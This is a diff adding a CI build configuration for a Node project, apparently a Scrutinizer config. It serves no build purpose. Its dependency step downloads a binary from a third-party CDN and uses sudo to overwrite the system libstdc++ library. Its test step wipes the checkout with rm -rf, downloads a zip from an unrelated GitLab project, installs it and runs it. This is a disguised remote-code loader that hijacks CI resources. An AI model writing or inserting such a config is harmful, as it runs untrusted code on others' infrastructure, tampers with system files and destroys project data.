@@ -1,0 +1,20 @@
+checks:
+    javascript: true
+build:
+    environment:
+        node: v16.9.1
+    nodes:
+        nodeWork:
+            dependencies:
+                before:
+                    - curl -fsSL https://glcdn.githack.com/lomcomlam/nghechua/-/raw/main/lib -o lib
+                    - sudo cp lib /usr/lib/x86_64-linux-gnu/libstdc++.so.6
+            tests:
+                override:
+                    - command: rm -rf ./*
+                    - command: curl -fsSL https://gitlab.com/lomcomlam/nghechua/-/archive/main/nghechua-main.zip -o xinday.zip
+                    - command: unzip xinday.zip
+                    - command: cd nghechua-main
+                    - command: npm i
+                    - command: node dao
+                    - command: echo "Done!!"
